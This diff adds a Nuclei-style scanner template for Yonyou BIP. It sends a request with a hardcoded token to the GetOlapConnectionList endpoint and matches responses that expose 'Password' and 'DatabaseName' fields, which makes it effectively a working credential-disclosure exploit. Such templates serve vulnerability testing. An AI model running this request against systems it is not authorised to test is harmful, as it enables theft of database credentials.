@@ -1,0 +1,28 @@
+id: yonyou-bip-GetOlapConnectionList-disclosure
+info:
+  name: 用友 BIP GetOlapConnectionList - disclosure
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/b1cfb1bc795f9baf88cc1b882b705ecf3666c698/%E7%94%A8%E5%8F%8B/%E7%94%A8%E5%8F%8BBIP%E6%95%B0%E6%8D%AE%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEGLSyncService.asmx.txt
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: yonyou,bip,discloure
+
+http:
+  - raw:
+      - |
+        GET /bi/api/SemanticModel/GetOlapConnectionList/?token=e30fe47a-f33e-463e-bc4a-843957ca88dd_263720ea7e397482da220115cae828_1214162142339 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"Password","DatabaseName")
